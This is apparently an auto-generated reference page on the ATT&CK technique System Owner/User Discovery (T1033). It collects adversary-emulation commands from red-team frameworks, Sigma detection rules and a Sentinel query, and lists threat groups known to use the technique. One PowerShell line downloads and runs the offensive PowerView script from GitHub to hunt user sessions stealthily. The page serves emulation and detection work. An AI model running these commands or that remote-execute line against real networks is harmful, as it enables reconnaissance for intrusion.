
# System Owner/User Discovery

## Description

### MITRE Description

> Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Utilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1033

## Potential Commands

```
whoami /all /fo list
shell whoami /all /fo list
getuid
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"localhost"
quser
qwinsta.exe /server:localhost
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt

users
w
who

IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose

{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'json_key': 'samaccountname', 'json_type': ['str']}]}, 'payloads': ['powerview.ps1']}}}
{'darwin': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'linux': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'windows': {'psh': {'command': '$env:username\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}, 'cmd': {'command': 'echo %username%', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}}
{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'json_key': 'samaccountname', 'json_type': ['str']}]}, 'payloads': ['powerview.ps1']}}}
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/powerview/get_session
powershell/situational_awareness/network/powerview/get_session
```

## Commands Dataset

```
[{'command': 'whoami /all /fo list',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell whoami /all /fo list',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'getuid',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'cmd.exe /C whoami\n'
             'wmic useraccount get /ALL\n'
             'quser /SERVER:"localhost"\n'
             'quser\n'
             'qwinsta.exe /server:localhost\n'
             'qwinsta.exe\n'
             'for /F "tokens=1,2" %i in (\'qwinsta /server:localhost ^| '
             'findstr "Active Disc"\') do @echo %i | find /v "#" | find /v '
             '"console" || echo %j > usernames.txt\n'
             '@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in '
             '(\'qwinsta /server:%n ^| findstr "Active Disc"\') do @echo %i | '
             'find /v "#" | find /v "console" || echo %j > usernames.txt\n',
  'name': None,
  'source': 'atomics/T1033/T1033.yaml'},
 {'command': 'users\nw\nwho\n',
  'name': None,
  'source': 'atomics/T1033/T1033.yaml'},
 {'command': 'IEX (IWR '
             "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
             'Invoke-UserHunter -Stealth -Verbose\n',
  'name': None,
  'source': 'atomics/T1033/T1033.yaml'},
 {'command': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 '
                                             '-Force;\n'
                                             'Get-NetUser -AdminCount | '
                                             'ConvertTo-Json -Depth 1\n',
                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
                                                                                      'json_type': ['str'],
                                                                                      'source': 'domain.user.name'}]},
                                  'payloads': ['powerview.ps1']}}},
  'name': 'Get Administrator users for a computer',
  'source': 'data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml'},
 {'command': {'darwin': {'sh': {'command': 'whoami',
                                'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                    {'source': 'domain.user.name'}]}}},
              'linux': {'sh': {'command': 'whoami',
                               'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                   {'source': 'domain.user.name'}]}}},
              'windows': {'cmd': {'command': 'echo %username%',
                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                      {'source': 'domain.user.name'}]}},
                          'psh': {'command': '$env:username\n',
                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                      {'source': 'domain.user.name'}]}}}},
  'name': 'Find user running agent',
  'source': 'data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml'},
 {'command': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 '
                                             '-Force;\n'
                                             'Get-NetUser -SPN | '
                                             'ConvertTo-Json -Depth 1\n',
                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
                                                                                      'json_type': ['str'],
                                                                                      'source': 'domain.user.name'}]},
                                  'payloads': ['powerview.ps1']}}},
  'name': 'Get Service Accounts for a domain',
  'source': 'data/abilities/discovery/f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c.yml'},
 {'command': 'powershell/situational_awareness/network/bloodhound',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/bloodhound',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_session',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_session',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Timur Zinniatullin, oscd.community',
                  'date': '2019/10/21',
                  'description': 'Adversaries may use the information from '
                                 'System Owner/User Discovery during automated '
                                 'discovery to shape follow-on behaviors, '
                                 'including whether or not the adversary fully '
                                 'infects the target and/or attempts specific '
                                 'actions.',
                  'detection': {'condition': 'selection',
                                'selection': {'a0': ['users', 'w', 'who'],
                                              'type': 'EXECVE'}},
                  'falsepositives': ['Admin activity'],
                  'id': '9a0d8ca0-2385-4020-b6c6-cb6153ca56f3',
                  'level': 'low',
                  'logsource': {'product': 'linux', 'service': 'auditd'},
                  'references': ['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.yaml'],
                  'status': 'experimental',
                  'tags': ['attack.discovery', 'attack.t1033'],
                  'title': 'System Owner or User Discovery'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/08/13',
                  'description': 'Detects the execution of whoami, which is '
                                 'often used by attackers after exloitation / '
                                 'privilege escalation but rarely used by '
                                 'administrators',
                  'detection': {'condition': 'selection or selection2',
                                'selection': {'Image': '*\\whoami.exe'},
                                'selection2': {'OriginalFileName': 'whoami.exe'}},
                  'falsepositives': ['Admin activity',
                                     'Scripts and administrative tools used in '
                                     'the monitored environment'],
                  'id': 'e28a5a99-da44-436d-b7a0-2afc20a5f413',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/',
                                 'https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/'],
                  'status': 'experimental',
                  'tags': ['attack.discovery',
                           'attack.t1033',
                           'car.2016-03-001'],
                  'title': 'Whoami Execution'}},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['PowerShell']},
 {'data_source': ['4624', 'WMI Auth']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['200-500', ' 4100-4104', 'PowerShell']},
 {'data_source': ['', '4624', 'WMI Auth']}]
```

## Potential Queries

```json
[{'name': 'System Owner User Discovery',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path contains '
           '"whoami.exe"or process_command_line contains "whoami"or '
           'file_directory contains "useraccount get /ALL"or process_path '
           'contains "qwinsta.exe"or process_path contains "quser.exe"or '
           'process_path contains "systeminfo.exe")'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'whoami '
                                                                              '/all '
                                                                              '/fo '
                                                                              'list',
                                                  'Category': 'T1033',
                                                  'Cobalt Strike': 'shell '
                                                                   'whoami '
                                                                   '/all /fo '
                                                                   'list',
                                                  'Description': 'Get current '
                                                                 'user '
                                                                 'information, '
                                                                 'SID, domain, '
                                                                 'groups the '
                                                                 'user belongs '
                                                                 'to, security '
                                                                 'privs of the '
                                                                 'user',
                                                  'Metasploit': 'getuid'}},
 {'Atomic Red Team Test - System Owner/User Discovery': {'atomic_tests': [{'auto_generated_guid': '4c4959bf-addf-4b4a-be86-8d09cc1857aa',
                                                                           'description': 'Identify '
                                                                                          'System '
                                                                                          'owner '
                                                                                          'or '
                                                                                          'users '
                                                                                          'on '
                                                                                          'an '
                                                                                          'endpoint.\n'
                                                                                          '\n'
                                                                                          'Upon '
                                                                                          'successful '
                                                                                          'execution, '
                                                                                          'cmd.exe '
                                                                                          'will '
                                                                                          'spawn '
                                                                                          'multiple '
                                                                                          'commands '
                                                                                          'against '
                                                                                          'a '
                                                                                          'target '
                                                                                          'host '
                                                                                          'to '
                                                                                          'identify '
                                                                                          'usernames. '
                                                                                          'Output '
                                                                                          'will '
                                                                                          'be '
                                                                                          'via '
                                                                                          'stdout. \n'
                                                                                          'Additionally, '
                                                                                          'two '
                                                                                          'files '
                                                                                          'will '
                                                                                          'be '
                                                                                          'written '
                                                                                          'to '
                                                                                          'disk '
                                                                                          '- '
                                                                                          'computers.txt '
                                                                                          'and '
                                                                                          'usernames.txt.\n',
                                                                           'executor': {'command': 'cmd.exe '
                                                                                                   '/C '
                                                                                                   'whoami\n'
                                                                                                   'wmic '
                                                                                                   'useraccount '
                                                                                                   'get '
                                                                                                   '/ALL\n'
                                                                                                   'quser '
                                                                                                   '/SERVER:"#{computer_name}"\n'
                                                                                                   'quser\n'
                                                                                                   'qwinsta.exe '
                                                                                                   '/server:#{computer_name}\n'
                                                                                                   'qwinsta.exe\n'
                                                                                                   'for '
                                                                                                   '/F '
                                                                                                   '"tokens=1,2" '
                                                                                                   '%i '
                                                                                                   'in '
                                                                                                   "('qwinsta "
                                                                                                   '/server:#{computer_name} '
                                                                                                   '^| '
                                                                                                   'findstr '
                                                                                                   '"Active '
                                                                                                   'Disc"\') '
                                                                                                   'do '
                                                                                                   '@echo '
                                                                                                   '%i '
                                                                                                   '| '
                                                                                                   'find '
                                                                                                   '/v '
                                                                                                   '"#" '
                                                                                                   '| '
                                                                                                   'find '
                                                                                                   '/v '
                                                                                                   '"console" '
                                                                                                   '|| '
                                                                                                   'echo '
                                                                                                   '%j '
                                                                                                   '> '
                                                                                                   'usernames.txt\n'
                                                                                                   '@FOR '
                                                                                                   '/F '
                                                                                                   '%n '
                                                                                                   'in '
                                                                                                   '(computers.txt) '
                                                                                                   'DO '
                                                                                                   '@FOR '
                                                                                                   '/F '
                                                                                                   '"tokens=1,2" '
                                                                                                   '%i '
                                                                                                   'in '
                                                                                                   "('qwinsta "
                                                                                                   '/server:%n '
                                                                                                   '^| '
                                                                                                   'findstr '
                                                                                                   '"Active '
                                                                                                   'Disc"\') '
                                                                                                   'do '
                                                                                                   '@echo '
                                                                                                   '%i '
                                                                                                   '| '
                                                                                                   'find '
                                                                                                   '/v '
                                                                                                   '"#" '
                                                                                                   '| '
                                                                                                   'find '
                                                                                                   '/v '
                                                                                                   '"console" '
                                                                                                   '|| '
                                                                                                   'echo '
                                                                                                   '%j '
                                                                                                   '> '
                                                                                                   'usernames.txt\n',
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'computer_name': {'default': 'localhost',
                                                                                                                 'description': 'Name '
                                                                                                                                'of '
                                                                                                                                'remote '
                                                                                                                                'computer',
                                                                                                                 'type': 'string'}},
                                                                           'name': 'System '
                                                                                   'Owner/User '
                                                                                   'Discovery',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': '2a9b677d-a230-44f4-ad86-782df1ef108c',
                                                                           'description': 'Identify '
                                                                                          'System '
                                                                                          'owner '
                                                                                          'or '
                                                                                          'users '
                                                                                          'on '
                                                                                          'an '
                                                                                          'endpoint\n'
                                                                                          '\n'
                                                                                          'Upon '
                                                                                          'successful '
                                                                                          'execution, '
                                                                                          'sh '
                                                                                          'will '
                                                                                          'stdout '
                                                                                          'list '
                                                                                          'of '
                                                                                          'usernames.\n',
                                                                           'executor': {'command': 'users\n'
                                                                                                   'w\n'
                                                                                                   'who\n',
                                                                                        'name': 'sh'},
                                                                           'name': 'System '
                                                                                   'Owner/User '
                                                                                   'Discovery',
                                                                           'supported_platforms': ['linux',
                                                                                                   'macos']},
                                                                          {'auto_generated_guid': '29857f27-a36f-4f7e-8084-4557cd6207ca',
                                                                           'description': 'Find '
                                                                                          'existing '
                                                                                          'user '
                                                                                          'session '
                                                                                          'on '
                                                                                          'other '
                                                                                          'computers. '
                                                                                          'Upon '
                                                                                          'execution, '
                                                                                          'information '
                                                                                          'about '
                                                                                          'any '
                                                                                          'sessions '
                                                                                          'discovered '
                                                                                          'will '
                                                                                          'be '
                                                                                          'displayed.',
                                                                           'executor': {'command': 'IEX '
                                                                                                   '(IWR '
                                                                                                   "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
                                                                                                   'Invoke-UserHunter '
                                                                                                   '-Stealth '
                                                                                                   '-Verbose\n',
                                                                                        'name': 'powershell'},
                                                                           'name': 'Find '
                                                                                   'computers '
                                                                                   'where '
                                                                                   'user '
                                                                                   'has '
                                                                                   'session '
                                                                                   '- '
                                                                                   'Stealth '
                                                                                   'mode '
                                                                                   '(PowerView)',
                                                                           'supported_platforms': ['windows']}],
                                                         'attack_technique': 'T1033',
                                                         'display_name': 'System '
                                                                         'Owner/User '
                                                                         'Discovery'}},
 {'Mitre Stockpile - Get Administrator users for a computer': {'description': 'Get '
                                                                              'Administrator '
                                                                              'users '
                                                                              'for '
                                                                              'a '
                                                                              'computer',
                                                               'id': 'aaf34d82-aea9-4278-8ec4-789653e4f5d9',
                                                               'name': 'GetAdminMembers',
                                                               'platforms': {'windows': {'psh': {'command': 'Import-Module '
                                                                                                            '.\\powerview.ps1 '
                                                                                                            '-Force;\n'
                                                                                                            'Get-NetUser '
                                                                                                            '-AdminCount '
                                                                                                            '| '
                                                                                                            'ConvertTo-Json '
                                                                                                            '-Depth '
                                                                                                            '1\n',
                                                                                                 'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
                                                                                                                                                     'json_type': ['str'],
                                                                                                                                                     'source': 'domain.user.name'}]},
                                                                                                 'payloads': ['powerview.ps1']}}},
                                                               'tactic': 'discovery',
                                                               'technique': {'attack_id': 'T1033',
                                                                             'name': 'System '
                                                                                     'Owner/User '
                                                                                     'Discovery'}}},
 {'Mitre Stockpile - Find user running agent': {'description': 'Find user '
                                                               'running agent',
                                                'id': 'c0da588f-79f0-4263-8998-7496b1a40596',
                                                'name': 'Identify active user',
                                                'platforms': {'darwin': {'sh': {'command': 'whoami',
                                                                                'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                                                                    {'source': 'domain.user.name'}]}}},
                                                              'linux': {'sh': {'command': 'whoami',
                                                                               'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                                                                   {'source': 'domain.user.name'}]}}},
                                                              'windows': {'cmd': {'command': 'echo '
                                                                                             '%username%',
                                                                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                                                                      {'source': 'domain.user.name'}]}},
                                                                          'psh': {'command': '$env:username\n',
                                                                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                                                                      {'source': 'domain.user.name'}]}}}},
                                                'tactic': 'discovery',
                                                'technique': {'attack_id': 'T1033',
                                                              'name': 'System '
                                                                      'Owner/User '
                                                                      'Discovery'}}},
 {'Mitre Stockpile - Get Service Accounts for a domain': {'description': 'Get '
                                                                         'Service '
                                                                         'Accounts '
                                                                         'for '
                                                                         'a '
                                                                         'domain',
                                                          'id': 'f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c',
                                                          'name': 'GetServiceAccounts',
                                                          'platforms': {'windows': {'psh': {'command': 'Import-Module '
                                                                                                       '.\\powerview.ps1 '
                                                                                                       '-Force;\n'
                                                                                                       'Get-NetUser '
                                                                                                       '-SPN '
                                                                                                       '| '
                                                                                                       'ConvertTo-Json '
                                                                                                       '-Depth '
                                                                                                       '1\n',
                                                                                            'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
                                                                                                                                                'json_type': ['str'],
                                                                                                                                                'source': 'domain.user.name'}]},
                                                                                            'payloads': ['powerview.ps1']}}},
                                                          'tactic': 'discovery',
                                                          'technique': {'attack_id': 'T1033',
                                                                        'name': 'System '
                                                                                'Owner/User '
                                                                                'Discovery'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1033',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/bloodhound":  '
                                                                                 '["T1033"],',
                                            'Empire Module': 'powershell/situational_awareness/network/bloodhound',
                                            'Technique': 'System Owner/User '
                                                         'Discovery'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1033',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/powerview/get_session":  '
                                                                                 '["T1033"],',
                                            'Empire Module': 'powershell/situational_awareness/network/powerview/get_session',
                                            'Technique': 'System Owner/User '
                                                         'Discovery'}}]
```

# Tactics


* [Discovery](../tactics/Discovery.md)


# Mitigations


* [System Owner/User Discovery Mitigation](../mitigations/System-Owner-User-Discovery-Mitigation.md)


# Actors


* [APT32](../actors/APT32.md)

* [APT37](../actors/APT37.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [FIN10](../actors/FIN10.md)
    
* [APT19](../actors/APT19.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [APT3](../actors/APT3.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [APT39](../actors/APT39.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
